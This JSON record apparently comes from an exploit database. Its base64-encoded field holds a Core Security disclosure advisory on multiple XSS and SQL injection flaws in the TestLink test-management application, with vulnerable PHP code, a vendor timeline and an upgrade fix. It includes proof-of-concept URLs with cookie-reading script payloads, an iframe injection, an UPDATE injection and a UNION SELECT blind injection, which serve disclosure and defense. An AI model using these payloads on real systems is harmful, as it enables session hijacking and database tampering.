{
    "source": "exploit-database", 
    "exploit": "ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBDb3JlIFNlY3VyaXR5IFRlY2hub2xvZ2llcyAtIENvcmVMYWJzDQpBZHZpc29yeQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIA0KaHR0cDovL3d3dy5jb3Jlc2VjdXJpdHkuY29tL2NvcmVsYWJzLw0KDQpNdWx0aXBsZSBYU1MgYW5kIEluamVjdGlvbiBWdWxuZXJhYmlsaXRpZXMgaW4gVGVzdExpbmsgVGVzdCBNYW5hZ2VtZW50DQphbmQgRXhlY3V0aW9uIFN5c3RlbQ0KDQoNCjEuICpBZHZpc29yeSBJbmZvcm1hdGlvbioNCg0KVGl0bGU6IE11bHRpcGxlIFhTUyBhbmQgSW5qZWN0aW9uIFZ1bG5lcmFiaWxpdGllcyBpbiBUZXN0TGluayBUZXN0DQpNYW5hZ2VtZW50IGFuZCBFeGVjdXRpb24gU3lzdGVtDQpBZHZpc29yeSBJZDogQ09SRS0yMDA5LTEwMTMNCkFkdmlzb3J5IFVSTDoNCmh0dHA6Ly93d3cuY29yZXNlY3VyaXR5LmNvbS9jb250ZW50L3Rlc3RsaW5rLW11bHRpcGxlLWluamVjdGlvbi12dWxuZXJhYmlsaXRpZXMNCkRhdGUgcHVibGlzaGVkOiAyMDA5LTEyLTA5DQpEYXRlIG9mIGxhc3QgdXBkYXRlOiAyMDA5LTEyLTA5DQpWZW5kb3JzIGNvbnRhY3RlZDogVGVzdExpbmsgQ29tbXVuaXR5DQpSZWxlYXNlIG1vZGU6IENvb3JkaW5hdGVkIHJlbGVhc2UNCg0KDQoyLiAqVnVsbmVyYWJpbGl0eSBJbmZvcm1hdGlvbioNCg0KQ2xhc3M6IENyb3NzIHNpdGUgc2NyaXB0aW5nIFtDV0UtNzldLCBTUUwgaW5qZWN0aW9uIFtDV0UtODldDQpJbXBhY3Q6IENvZGUgZXhlY3V0aW9uDQpSZW1vdGVseSBFeHBsb2l0YWJsZTogWWVzDQpMb2NhbGx5IEV4cGxvaXRhYmxlOiBObw0KQnVndHJhcSBJRDogMzcyNTgNCkNWRSBOYW1lOiBDVkUtMjAwOS00MjM3LCBDVkUtMjAwOS00MjM4DQoNCg0KMy4gKlZ1bG5lcmFiaWxpdHkgRGVzY3JpcHRpb24qDQoNCiBNdWx0aXBsZSBpbmplY3Rpb24gKGJvdGggWFNTIFsxXSBhbmQgU1FMKSB2dWxuZXJhYmlsaXRpZXMgaGF2ZSBiZWVuDQpkaXNjb3ZlcmVkIGluIFRlc3RsaW5rIFsyXSwgYSB3aWRlbHkgdXNlZCB0ZXN0LWNhc2UgbWFuYWdlbWVudA0KYXBwbGljYXRpb24gd3JpdHRlbiBpbiBQSFAgWzNdLiBPbmUgb2YgdGhlIFhTUyB2dWxuZXJhYmlsaXRpZXMsDQpkaXNjb3ZlcmVkIGluIGl0cyBsb2dpbiBzY3JlZW4sIGNhbiBiZSBleHBsb2l0ZWQgd2l0aG91dCBhbg0KYXV0aGVudGljYXRlZCBzZXNzaW9uLg0KDQoNCjQuICpWdWxuZXJhYmxlIHBhY2thZ2VzKg0KDQogICAuIFRlc3RMaW5rIDEuOC4wDQogICAuIFRlc3RMaW5rIDEuOC4xDQogICAuIFRlc3RMaW5rIDEuOC4yDQogICAuIFRlc3RMaW5rIDEuOC4zDQogICAuIFRlc3RMaW5rIDEuOC40DQogICAuIE9sZGVyIHZlcnNpb25zIGFyZSBwcm9iYWJseSBhZmZlY3RlZCB0b28sIGJ1dCB0aGV5IHdlcmUgbm90IGNoZWNrZWQuDQoNCg0KNS4gKk5vbi12dWxuZXJhYmxlIHBhY2thZ2VzKg0KDQogICAuIFRlc3RMaW5rIDEuOC41DQoNCg0KNi4gKlNvbHV0aW9ucyBhbmQgV29ya2Fyb3VuZHMqDQoNCiBVcGdyYWRlIHRvIGEgbm9uLXZ1bG5lcmFibGUgdmVyc2lvbiwgc3VjaCBhcyAxLjguNS4gVGVzdExpbmsgZmVhdHVyZXMNCnRoZSBvcHRpb24gdG8gdXBncmFkZSBhIGN1cnJlbnQgaW5zdGFsbGF0aW9uIGluIGl0cyBpbnN0YWxsIHNjcmlwdHMuDQoNCg0KNy4gKkNyZWRpdHMqDQoNCiBUaGVzZSB2dWxuZXJhYmlsaXRpZXMgd2VyZSBkaXNjb3ZlcmVkIGFuZCByZXNlYXJjaGVkIGJ5IFBhYmxvDQpBbm5ldHRhLCBmcm9tIENvcmUgU2VjdXJpdHkgVGVjaG5vbG9naWVzLCBkdXJpbmcgQ29yZSBCdWd3ZWVrIDIwMDkgYXMNCmEgbWVtYmVyIG9mIHRoZSAiTG9zIEhlcmVkZXJvcyBkZSBEb24gUGFibG8gKEhEUCkiIHRlYW0uDQoNCg0KOC4gKlRlY2huaWNhbCBEZXNjcmlwdGlvbiAvIFByb29mIG9mIENvbmNlcHQgQ29kZSoNCg0KIE1vc3Qgb2YgdGhlc2UgdnVsbmVyYWJpbGl0aWVzIGFyZSBwcmVzZW50IGluIHRoZSBUZXN0bGluayBjb2RlDQpiZWNhdXNlIHRoZSBsb2dpYyBmb3IgdGhlIHNhbml0aXphdGlvbiBvZiB1c2VyIGlucHV0IGlzIHJ1ZGltZW50YXJ5Lg0KRWFjaCBzY3JpcHQgc2FuaXRpemVzIGl0cyBvd24gaW5wdXQsIGluc3RlYWQgb2YgYWJzdHJhY3RpbmcgdGhpcyB0YXNrDQp0byBhbm90aGVyIGxheWVyIG9mIGxvZ2ljLiBPZnRlbiBvbmx5IHNsYXNoZXMgYXJlIHN0cmlwcGVkLCBidXQgaHRtbA0KZW50aXRpZXMgYXJlIGFsbW9zdCBuZXZlciBlc2NhcGVkLg0KDQogVGhlIG9ubHkgdnVsbmVyYWJpbGl0eSBpbiB0aGlzIHJlcG9ydCB0aGF0IGNhbiBiZSBleHBsb2l0ZWQgd2l0aG91dA0KYW4gYXV0aGVudGljYXRlZCBzZXNzaW9uIGlzIGEgWFNTIHZ1bG5lcmFiaWxpdHkgaW4gVGVzdGxpbmsncyBsb2dpbg0KcGFnZSAnbG9naW4ucGhwJy4gVGhpcyBzY3JpcHQgZ2V0cyBhIHBhcmFtZXRlciBuYW1lZCAncmVxJywgd2hpY2ggaXMNCnVzZWQgYnkgdGhlIGFwcGxpY2F0aW9uIHRvIHNldCB0aGUgbmV4dCByZXF1ZXN0IHRvIGJlIG1hZGUuIEFsbA0KcGFyYW1ldGVycyBhcmUgaW5pdGlhbGl6ZWQgaW4gdGhlICdpbml0X2FyZ3MnIGZ1bmN0aW9uIHdoaWNoIGRvZXNuJ3QNCnNhbml0aXplIGl0cyBhcmd1bWVudHMgYXBwcm9wcmlhdGVseSBhcyBzZWVuIGJlbG93Lg0KDQovLS0tLS0NCmZ1bmN0aW9uIGluaXRfYXJncygpDQp7DQogICAgJGFyZ3MgPSBuZXcgc3RkQ2xhc3MoKTsNCiAgICAkX1JFUVVFU1QgPSBzdHJpbmdzX3N0cmlwU2xhc2hlcygkX1JFUVVFU1QpOw0KICAgIA0KICAgICRhcmdzLT5ub3RlID0gaXNzZXQoJF9SRVFVRVNUWydub3RlJ10pID8gJF9SRVFVRVNUWydub3RlJ10gOiBudWxsOw0KICAgICRhcmdzLT5sb2dpbiA9IGlzc2V0KCRfUkVRVUVTVFsndGxfbG9naW4nXSkgPw0KdHJpbSgkX1JFUVVFU1RbJ3RsX2xvZ2luJ10pIDogbnVsbDsNCiAgICAkYXJncy0+cHdkID0gaXNzZXQoJF9SRVFVRVNUWyd0bF9wYXNzd29yZCddKSA/DQokX1JFUVVFU1RbJ3RsX3Bhc3N3b3JkJ10gOiBudWxsOw0KDQogICAgJGFyZ3MtPnJlcVVSSSA9IGlzc2V0KCRfUkVRVUVTVFsncmVxJ10pID8gJF9SRVFVRVNUWydyZXEnXSA6IG51bGw7DQogICAgJGFyZ3MtPnByZXFVUkkgPSAoaXNzZXQoJF9SRVFVRVNUWydyZXFVUkknXSkgJiYNCnN0cmxlbigkX1JFUVVFU1RbJ3JlcVVSSSddKSkgPyAkX1JFUVVFU1RbJ3JlcVVSSSddIDogbnVsbDsNCiANCiAgICByZXR1cm4gJGFyZ3M7DQp9DQotIC0tLS0tLw0KDQogVGhpcyB2dWxuZXJhYmlsaXR5IGNhbiBiZSB2ZXJpZmllZCBieSBpc3N1aW5nIHRoZSBmb2xsb3dpbmcgcmVxdWVzdA0KdG8gYSBUZXN0bGluayBpbnN0YWxsYXRpb24gb24gbG9jYWxob3N0Og0KDQovLS0tLS0NCmh0dHA6Ly8xMjcuMC4wLjEvdGVzdGxpbmsvbG9naW4ucGhwP3JlcT0iOz48aWZyYW1lIHNyYw0KPSJodHRwOi8vd3d3LmNvcmVzZWN1cml0eS5jb20vY29udGVudC94eHh4Ijsgd2lkdGg9IjEwMCUiDQpoZWlnaHQ9IjMwMCI+PC9pZnJhbWU+DQotIC0tLS0tLw0KDQoNCiBPdGhlciBYU1MgdnVsbmVyYWJpbGl0aWVzIG9uIGRpZmZlcmVudCBzY3JpcHRzIGNhbiBiZSBleHBsb2l0ZWQgd2l0aA0KYW4gYXV0aGVudGljYXRlZCBzZXNzaW9uLiBQcm9vZiBvZiBjb25jZXB0IGNvZGUgZm9sbG93czoNCg0KLy0tLS0tDQpodHRwOi8vMTI3LjAuMC4xL3Rlc3RsaW5rL2xpYi9nZW5lcmFsL3N0YXRpY1BhZ2UucGhwP2tleT0iOz48c2NyaXB0PmFsZXJ0KGRvY3VtZW50LmNvb2tpZSk8L3NjcmlwdD4NCg0KaHR0cDovLzEyNy4wLjAuMS90ZXN0bGluay9saWIvYXR0YWNobWVudHMvYXR0YWNobWVudHVwbG9hZC5waHA/aWQ9MSZ0YWJsZU5hbWU9JzxzY3JpcHQ+YWxlcnQoZG9jdW1lbnQuY29va2llKTwvc2NyaXB0Pg0KaHR0cDovLzEyNy4wLjAuMS90ZXN0bGluay9saWIvZXZlbnRzL2V2ZW50dmlld2VyLnBocD9zdGFydERhdGU9Ijs8c2NyaXB0PmFsZXJ0KGRvY3VtZW50LmNvb2tpZSk8L3NjcmlwdD4NCmh0dHA6Ly8xMjcuMC4wLjEvdGVzdGxpbmsvbGliL2V2ZW50cy9ldmVudHZpZXdlci5waHA/ZW5kRGF0ZT0iOzxzY3JpcHQ+YWxlcnQoZG9jdW1lbnQuY29va2llKTwvc2NyaXB0Pg0KaHR0cDovLzEyNy4wLjAuMS90ZXN0bGluay9saWIvZXZlbnRzL2V2ZW50dmlld2VyLnBocD9sb2dMZXZlbD0iOzxzY3JpcHQ+YWxlcnQoZG9jdW1lbnQuY29va2llKTwvc2NyaXB0Pg0KLSAtLS0tLS8NCg0KDQogVGhlcmUgYXJlIG1vcmUgWFNTIGF0dGFja3MgdGhhdCBjYW4gYmUgZXhlY3V0ZWQgd2l0aCAqYW4NCmF1dGhlbnRpY2F0ZWQgc2Vzc2lvbiogb24gaW5zdGFsbGF0aW9ucyB0aGF0IGhhdmUgKmF0IGxlYXN0IG9uZSB0ZXN0DQpwbGFuIGNyZWF0ZWQqLiBNb3N0IG9mIHRoZXNlIGFyZSBkdWUgdG8gYW4gJ2VjaG8nIHN0YXRlbWVudCBpbg0KVGVzdExpbmsncyBkYXRhYmFzZSBmdW5jdGlvbnMgdGhhdCBkaXJlY3RseSBvdXRwdXRzIFNRTCBlcnJvcnMgYmFjayB0bw0KdGhlIGJyb3dzZXIgd2l0aG91dCBlc2NhcGluZyBodG1sIGVudGl0aWVzLiBUaGlzIGNhbiBiZSBmb3VuZCBvbiBsaW5lDQoxODEgb2YgJ3Rlc3RsaW5rL2xpYi9mdW5jdGlvbnMvZGF0YWJhc2UuY2xhc3MucGhwJywgd2hlcmUgc29tZQ0KZnVuY3Rpb24gc3VjaCBhcyAnaHRtbHNwZWNpYWxjaGFycycgc2hvdWxkIGJlIGNhbGxlZCBvbiAnDQokdGhpcy0+ZXJyb3IoJHBfcXVlcnkpJyBhbmQgJyRtZXNzYWdlJy4gQSB0ZW1wbGF0aW5nIGVuZ2luZSAoVGVzdExpbmsNCnVzZXMgU21hcnR5IGZvciBtYW55IG90aGVyIHRhc2tzKSBjb3VsZCBhbHNvIGJlIHVzZWQgdG8gb3V0cHV0IHRoZXNlDQplcnJvcnMuDQoNCi8tLS0tLQ0KaWYgKCAhJHRfcmVzdWx0ICkgew0KICAgIGVjaG8gIkVSUk9SIE9OIGV4ZWNfcXVlcnkoKSAtIGRhdGFiYXNlLmNsYXNzLnBocCA8YnI+IiAuDQokdGhpcy0+ZXJyb3IoJHBfcXVlcnkpIC4gIjxicj4iOw0KICBlY2hvICI8YnI+IFRIRSBNRVNTQUdFIDo6ICRtZXNzYWdlLiAiPGJyPiI7DQogICAgcmV0dXJuIGZhbHNlOw0KfSBlbHNlIHsNCiAgICByZXR1cm4gJHRfcmVzdWx0Ow0KfQ0KLSAtLS0tLS8NCg0KIFRoaXMgcHJvb2Ygb2YgY29uY2VwdCBjb2RlIHRyaWdnZXJzIHRoZSB2dWxuZXJhYmlsaXRpZXMgZGVzY3JpYmVkIGFib3ZlOg0KDQovLS0tLS0NCmh0dHA6Ly8xMjcuMC4wLjEvL3Rlc3RsaW5rL2xpYi90ZXN0Y2FzZXMvc2VhcmNoRGF0YS5waHA/ZG9TZWFyY2g9ZmluZCZzdW1tYXJ5PScmZXhwZWN0ZWRfcmVzdWx0cz0nPHNjcmlwdD5hbGVydChkb2N1bWVudC5jb29raWUpPC9zY3JpcHQ+DQpodHRwOi8vMTI3LjAuMC4xLy90ZXN0bGluay9saWIvdGVzdGNhc2VzL3NlYXJjaERhdGEucGhwP2RvU2VhcmNoPWZpbmQmc3VtbWFyeT0nJm5hbWU9PHNjcmlwdD5hbGVydChkb2N1bWVudC5jb29raWUpPC9zY3JpcHQ+DQpodHRwOi8vMTI3LjAuMC4xLy90ZXN0bGluay9saWIvdGVzdGNhc2VzL3NlYXJjaERhdGEucGhwP2RvU2VhcmNoPWZpbmQmc3VtbWFyeT0nJnN0ZXBzPTxzY3JpcHQ+YWxlcnQoZG9jdW1lbnQuY29va2llKTwvc2NyaXB0Pg0KaHR0cDovLzEyNy4wLjAuMS8vdGVzdGxpbmsvbGliL3Rlc3RjYXNlcy9zZWFyY2hEYXRhLnBocD9kb1NlYXJjaD1maW5kJnN1bW1hcnk9JzxzY3JpcHQ+YWxlcnQoZG9jdW1lbnQuY29va2llKTwvc2NyaXB0Pg0KLSAtLS0tLS8NCg0KIE1vcmUgWFNTIHZ1bG5lcmFiaWxpdGllcyBjYW4gYWxzbyBiZSB0cmlnZ2VyZWQgYmVjYXVzZSBvZiB0aGUgcHJvYmxlbQ0KZGVzY3JpYmVkIGFib3ZlLCBidXQgYWxzbyBiZWNhdXNlIGFub3RoZXIgaW5kZXBlbmRlbnQgWFNTIGV4aXN0cyBvbg0KJ3Jlc3VsdHNNb3JlQnVpbGRzX2J1aWxkUmVwb3J0LnBocCcgY2F1c2VkIGJ5IG5vdCBlc2NhcGluZyB0aGUNCidzZWFyY2hfbm90ZXNfc3RyaW5nJywgYnkgaXNzdWluZyB0aGlzIHJlcXVlc3QgKGFsc28gd2hlbiBsb2dnZWQgaW50bw0KYW4gaW5zdGFsbGF0aW9uIHdpdGggYSBUZXN0IFBsYW4gY3JlYXRlZCk6DQoNCi8tLS0tLQ0KaHR0cDovLzEyNy4wLjAuMS90ZXN0bGluay9saWIvcmVzdWx0cy9yZXN1bHRzTW9yZUJ1aWxkc19idWlsZFJlcG9ydC5waHA/cmVwb3J0X3R5cGU9MCZkaXNwbGF5X3F1ZXJ5X3BhcmFtcz0xJnNlYXJjaF9ub3Rlc19zdHJpbmc9PC90ZD48c2NyaXB0PmFsZXJ0KGRvY3VtZW50LmNvb2tpZSk8L3NjcmlwdD4NCi0gLS0tLS0vDQoNCg0KIFdpdGggYW4gYXV0aGVudGljYXRlZCBzZXNzaW9uLCB0aGUgZm9sbG93aW5nIFNRTCBpbmplY3Rpb24gYnVnIGNhbg0KYWxzbyBiZSBleHBsb2l0ZWQuDQoNCiBJbiAnaHR0cDovLzEyNy4wLjAuMS90ZXN0bGluay9saWIvZ2VuZXJhbC9uYXZCYXIucGhwJywgZmlsbGluZyBpbiB0aGUNCidUZXN0IENhc2UgSUQnIGZpZWxkIHdpdGggJ1RDLTEgb3IgMSA9IDEgdXBkYXRlIHRjdmVyc2lvbnMgc2V0IHN1bW1hcnkNCj0gJzwvdGQ+PHNjcmlwdD5hbGVydChkb2N1bWVudC5jb29raWUpPC9zY3JpcHQ+PHRkPicnIHJlc3VsdHMgaW4NCnJlZmxlY3RlZCBIVE1MLg0KDQogQWxzbyB3aXRoIGFuIGF1dGhlbnRpY2F0ZWQgc2Vzc2lvbiB0aGUgZm9sbG93aW5nIGJsaW5kIFNRTCBpbmplY3Rpb24NCmV4aXN0cw0KDQovLS0tLS0NCmh0dHA6Ly8xMjcuMC4wLjEvdGVzdGxpbmsvbGliL2V2ZW50cy9ldmVudHZpZXdlci5waHA/bG9nTGV2ZWw9MSwxKSUyMHVuaW9uJTIwU0VMRUNUJTIwaWQlMjBGUk9NJTIwdGVzdHBsYW5zJTIwJTIzDQotIC0tLS0tLw0KDQoNCjkuICpSZXBvcnQgVGltZWxpbmUqDQoNCi4gMjAwOS0xMC0yOToNCkNvcmUgU2VjdXJpdHkgVGVjaG5vbG9naWVzIG5vdGlmaWVzIFRvc2hpeXVraSBLYXdhbmlzaGkgKGF0IGhpcw0KQHVzZXJzLnNvdXJjZWZvcmdlLmpwIGFkZHJlc3MpIGZyb20gdGhlIFRlYW1zdCB0ZWFtIG9mIHRoZQ0KdnVsbmVyYWJpbGl0aWVzLCBvZmZlcmluZyBhIGRyYWZ0IGZvciB0aGlzIGFkdmlzb3J5IGluIHBsYWludGV4dCBvcg0KZW5jcnlwdGVkIGZvcm0gKGlmIHByb3BlciBrZXlzIGFyZSBzZW50KS4gTm92ZW1iZXIgOXRoLCAyMDA5LCBpcw0KcHJvcG9zZWQgYXMgYSByZWxlYXNlIGRhdGUuDQoNCi4gMjAwOS0xMS0wMjoNCkJlY2F1c2Ugbm8gcmVzcG9uc2Ugd2FzIG9idGFpbmVkIGZyb20gVG9zaGl5dWtpIGF0IGhpcw0KQHVzZXJzLnNvdXJjZWZvcmdlLmpwLCBDb3JlIFNlY3VyaXR5IFRlY2hub2xvZ2llcyB0cmllcyB0byBjb250YWN0IGhpbQ0KdXNpbmcgdGhlICJDb250YWN0IiB3ZWJmb3JtIGluIGh0dHA6Ly93d3cudGVhbXN0Lm9yZy4NCg0KLiAyMDA5LTExLTA5Og0KU2luY2UgdGhlcmUgaXMgc3RpbGwgbm8gcmVwbHkgZnJvbSBUb3NoaXl1a2ksIENvcmUgbm93IHRyaWVzDQpjb250YWN0aW5nIEZyYW5jaXNjbyBNYW5jYXJkaS4gTm92ZW1iZXIgMjNyZCBpcyBub3cgcHJvcG9zZWQgYXMgYQ0KcmVsZWFzZSBkYXRlLg0KDQouIDIwMDktMTEtMDk6DQpGcmFuY2lzY28gTWFuY2FyZGkgcmVwbGllcyBhc2tpbmcgdGhhdCBhIGNvcHkgaW4gcGxhaW50ZXh0IG9mIHRoZQ0KYWR2aXNvcnkgYmUgc2VudCB0byBoaW0sIGFuZCBhbHNvIHRvIFRvc2hpeXVraSBLYXdhbmlzaGkgYW5kIE1hcnRpbg0KSGF2bGF0Lg0KDQouIDIwMDktMTEtMDk6DQpDb3JlIHNlbmRzIGEgZHJhZnQgZm9yIHRoaXMgYWR2aXNvcnksIGluY2x1ZGluZyB0aGUgdGVjaG5pY2FsDQpkZXNjcmlwdGlvbiBvZiB0aGUgdnVsbmVyYWJpbGl0aWVzLCB0byBGcmFuY2lzY28gTWFuY2FyZGksIFRvc2hpeXVraQ0KS2F3YW5pc2hpIGFuZCBNYXJ0aW4gSGF2bGF0Lg0KDQouIDIwMDktMTEtMTA6DQpNYXJ0aW4gSGF2bGF0IHJlcGxpZXMgYWNrbm93bGVkZ2luZyByZWNlcHRpb24gb2YgdGhlIGFkdmlzb3J5IGRyYWZ0LA0KYW5kIHRlbGxzIENvcmUgdGhhdCBpbnRlcm5hbCBpc3N1ZSAjMjk0NyBoYXMgYmVlbiBjcmVhdGVkIGluIHRoZWlyIGJ1Zw0KdHJhY2tpbmcgc3lzdGVtIHRvIGZpeCB0aGVzZSBidWdzLiBIZSBtZW50aW9ucyB0aGVzZSBpc3N1ZXMgc2hhbGwgYmUNCmZpeGVkIG9uIHJlbGVhc2UgMS44LjUgb2YgVGVzdExpbmsuDQoNCi4gMjAwOS0xMS0xMjoNCkNvcmUgcmVwbGllcyBhc2tpbmcgZm9yIG1vcmUgaW5mb3JtYXRpb24gcmVnYXJkaW5nIHRoZSByZWxlYXNlIGRhdGUgb2YNClRlc3RMaW5rIDEuOC41LiBBbiBhY2NvdW50IGlzIGNyZWF0ZWQgYnkgQ29yZSBpbiBUZXN0TGluaydzIGludGVybmFsDQpidWcgdHJhY2tpbmcgc3lzdGVtIHRvIGFjY2VzcyBpbmZvcm1hdGlvbiBhYm91dCBpc3N1ZSAjMjk0Ny4NCg0KLiAyMDA5LTExLTE3Og0KQ29yZSByZXF1ZXN0cyBhZ2FpbiBpbmZvcm1hdGlvbiByZWdhcmRpbmcgdGhlIHJlbGVhc2UgZGF0ZSBvZiBUZXN0TGluaw0KMS44LjUgaW4gb3JkZXIgdG8gc2NoZWR1bGUgdGhlIHJlbGVhc2Ugb2YgdGhpcyBhZHZpc29yeSBhY2NvcmRpbmdseSwNCnNpbmNlIG5vIHJlcGx5IG9uIHRoaXMgaGFzIGJlZW4geWV0IGdpdmVuIGJ5IHRoZSBUZXN0TGluayBkZXZlbG9wZXJzDQpjb250YWN0ZWQuIENvcmUgYWxzbyBtZW50aW9ucyB0aGF0IGlzc3VlICMyOTQ3IGNhbm5vdCBiZSBhY2Nlc3NlZCBieQ0KdGhlIHVzZXIgY3JlYXRlZCBpbiBvcmRlciB0byBmb2xsb3cgdGhlIGRldmVsb3BtZW50IG9mIGEgcGF0Y2ggZm9yIHRoZQ0KdnVsbmVyYWJpbGl0aWVzIHJlcG9ydGVkIGhlcmUuDQoNCi4gMjAwOS0xMS0xNzoNCkZyYW5jaXNjbyBNYW5jYXJkaSByZXBsaWVzIHNwZWNpZnlpbmcgdGhhdCAibWF5YmUgW2lzc3VlICMyOTQ3XSBoYXMNCnByaXZhdGUgc3RhdHVzIi4NCg0KLiAyMDA5LTExLTIwOg0KQ29yZSBhc2tzIG9uY2UgbW9yZSBmb3IgYSByZWxlYXNlIGRhdGUgZm9yIGEgZml4ZWQgdmVyc2lvbiBvZg0KVGVzdExpbmsuIFRoZSBhZHZpc29yeSBpcyByZXNjaGVkdWxlZCBmb3IgcmVsZWFzZSBvbiBNb25kYXkgMzB0aCwNCk5vdmVtYmVyLCBzaW5jZSB0aGVyZSBpcyBubyBpbmZvcm1hdGlvbiByZWdhcmRpbmcgdGhlIHBvc3NpYmlsaXR5IG9mDQptZWV0aW5nIHRoZSBkZWFkbGluZSBvZiBNb25kYXkgMjNyZCBieSB0aGUgVGVzdExpbmsgdGVhbS4gQ29yZSBhbHNvDQptZW50aW9ucyB0aGF0IHRoZXkgYXJlIGVhZ2VyIHRvIHBhc3NpdmVseSBtb25pdG9yIHRoZSBwcm9ncmVzcyBvZiB0aGUNClRlc3RMaW5rIGRldmVsb3BlcnMgaW4gZml4aW5nIHRoZXNlIGlzc3VlcyBpZiBhY2Nlc3MgaXMgZ2l2ZW4gdG8gaXNzdWUNCiMyOTQ3IHRvIHRoZWlyIGNyZWF0ZWQgYWNjb3VudCBvbiBUZXN0TGluaydzIGJ1ZyB0cmFja2luZyBzeXN0ZW0uDQoNCi4gMjAwOS0xMS0yNjoNClNpbmNlIHRoZXJlIHdhcyBubyByZXBseSB0byB0aGVpciBsYXN0IGUtbWFpbCwgQ29yZSByZXNlbmRzIGl0LA0KcmVtaW5kaW5nIHRoZSBkZXZlbG9wZXJzIHRoYXQgdGhlaXIgcGxhbm5lZCByZWxlYXNlIGRhdGUgZm9yIHRoZQ0KYWR2aXNvcnkgaXMgTW9uZGF5IDMwdGgsIGFuZCB0aGF0IHRoZXkgd291bGQgbGlrZSB0byBrbm93IGlmIHRoZXJlIGlzDQphIHBsYW5uZWQgcmVsZWFzZSBkYXRlIGZvciBhIGZpeGVkIHZlcnNpb24gb2YgVGVzdExpbmsuIENvcmUgcmVtaW5kcw0KdGhlIGRldmVsb3BlcnMgYWJvdXQgdGhlaXIgY29tbWl0bWVudCBpbiBoZWxwaW5nIHRoZW0gaW4gY29ycmVjdGx5DQpmaXhpbmcgdGhlIGJ1Zywgc2hvdWxkIHRoZXkgZ2V0IGFjY2VzcyB0byBwcml2YXRlIGlzc3VlICMyOTQ3Lg0KDQouIDIwMDktMTEtMjc6DQpNYXJ0aW4gSGF2bGF0IHJlcGxpZXMgdGhhdCBkdWUgdG8gcHJpb3JpdGllcyBpbiB0aGUgaW50ZXJuYWwNCmRldmVsb3BtZW50IGdyb3VwIG9mIFRlc3RsaW5rIHRoZSBidWcgaGFzIG5vdCB5ZXQgYmVlbiBmaXhlZC4gSGUNCmNvbW1pdHMgdG8gcmVsZWFzZSBUZXN0TGluayAxLjguNSBhcyBzb29uIGFzIHRoaXMgYnVnIGlzIGZpeGVkLCBidXQNCmJlc2lkZXMgc3RhdGluZyB0aGF0IGhlIHdpc2hlZCB0byBoYXZlIHRpbWUgdG8gZml4IHRoaXMgaGltc2VsZiwgbm8NCmZpcm0gb3IgdmVyaWZpYWJsZSBjbGFpbSBpcyBtYWRlIHRoYXQgY2FuIGFzc3VyZSBDb3JlIG9mIGEgcGxhbm5lZCBmaXgNCmFuZCByZWxlYXNlLg0KDQouIDIwMDktMTEtMjc6DQpDb3JlIHJlc2NoZWR1bGVzIGl0cyBpbnRlcm5hbCBwdWJsaWNhdGlvbiBkYXRlIGZvciB0aGlzIGFkdmlzb3J5IHRvDQpEZWNlbWJlciAxNHRoLiBUaGlzIHdpbGwgYmUgdGhlIGZpbmFsIGRhdGUgYW5kIGEgdXNlci1yZWxlYXNlIHdpbGwgYmUNCm1hZGUsIHVubGVzcyBUZXN0TGluayBkZXZlbG9wZXJzIHNoYXJlIGluZm9ybWF0aW9uIHRoYXQgY2FuIGJlDQp2ZXJpZmllZCBieSBDb3JlIHRoYXQgc2hvd3MgY29tbWl0bWVudCB0byBldmVudHVhbGx5IGxvb2tpbmcgaW50byBzYWlkDQpidWdzIGFuZCBmaXhpbmcgdGhlbS4gQ29yZSBzdWdnZXN0cyB0aGF0IGRldmVsb3BlcnMgYWN0dWFsbHkgaW4gY2hhcmdlDQpvZiB0aGVzZSBpc3N1ZXMgYXJlIGNvcGllZCBpbiB0aGUgZS1tYWlsIGxvb3AsIG9yIHRoYXQgYWNjZXNzIHRvDQppbnRlcm5hbCBpc3N1ZS10cmFja2luZyB0b29scyBiZSBnaXZlbiB0byB0aGVtIHRvIGFjdGl2ZWx5IHBhcnRpY2lwYXRlDQppbiB0aGUgZGlzY3Vzc2lvbnMgYW5kIHRoZSBwYXRjaGluZyBwcm9jZXNzLg0KDQouIDIwMDktMTEtMzA6DQpNYXJ0aW4gSGF2bGF0IGFza3MgZm9yIHRlY2huaWNhbCBkZXRhaWxzIG5lZWRlZCBieSBoaW0gdG8gY29uZmlybSBzb21lDQpvZiB0aGVzZSB2dWxuZXJhYmlsaXRpZXMuDQoNCi4gMjAwOS0xMi0wMToNCkNvcmUgcmVwbGllcyB3aXRoIHRoZSB0ZWNobmljYWwgZGV0YWlscyBuZWVkZWQgYnkgTWFydGluIEhhdmxhdC4NCg0KLiAyMDA5LTEyLTAyOg0KTWFydGluIEhhdmxhdCBzZW5kcyBhIHBhdGNoZWQgdmVyc2lvbiBvZiBUZXN0TGluayB0byBDb3JlIGFza2luZyBmb3INCnZlcmlmaWNhdGlvbiBvZiBmaXhlcyB0byBzb21lIG9mIHRoZSB2dWxuZXJhYmlsaXRpZXMgcmVwb3J0ZWQgaW4gdGhpcw0KYWR2aXNvcnkuDQoNCi4gMjAwOS0xMi0wMzoNCkNvcmUgcmVwbGllcyBzYXlpbmcgdGhhdCB0aGUgZml4ZXMgcHJvcG9zZWQgYnkgTWFydGluIEhhdmxhdCBmYWlsIHRvDQpwYXRjaCB0aG9zZSBzcGVjaWZpYyB2dWxuZXJhYmlsaXRpZXMuIFRoZSBidWdzIGFyZSBmdXJ0aGVyIHJlc2VhcmNoZWQNCmJ5IENvcmUgYW5kIHRoZSBhZHZpc29yeSBkcmFmdCBpcyBtb2RpZmllZCB0byBpbmNsdWRlIGEgbW9yZSBkZXRhaWxlZA0KZXhwbGFuYXRpb24gb2YgdGhlc2UgYnVncy4gVGhpcyB0ZWNobmljYWwgaW5mb3JtYXRpb24gaXMgc2hhcmVkIGJ5DQpDb3JlIHdpdGggTWFydGluIEhhdmxhdCBhbmQgc29tZSBpbnNpZ2h0IGludG8gcG9zc2libGUgZml4ZXMgaXMgYWxzbw0KZ2l2ZW4uDQoNCi4gMjAwOS0xMi0wOToNClRlc3RMaW5rIDEuOC41IGlzIHJlbGVhc2VkLg0KDQouIDIwMDktMTItMDk6DQpBZHZpc29yeSBDT1JFLTIwMDktMTAxMyBpcyBwdWJsaXNoZWQuDQoNCg0KMTAuICpSZWZlcmVuY2VzKg0KDQpbMV0gaHR0cDovL3d3dy5vd2FzcC5vcmcvaW5kZXgucGhwL0Nyb3NzLXNpdGVfU2NyaXB0aW5nXyhYU1MpDQpbMl0gaHR0cDovL3d3dy50ZWFtc3Qub3JnLw0KWzNdIGh0dHA6Ly93d3cub3dhc3Aub3JnL2luZGV4LnBocC9QSFBfVG9wXzUNCg0KDQ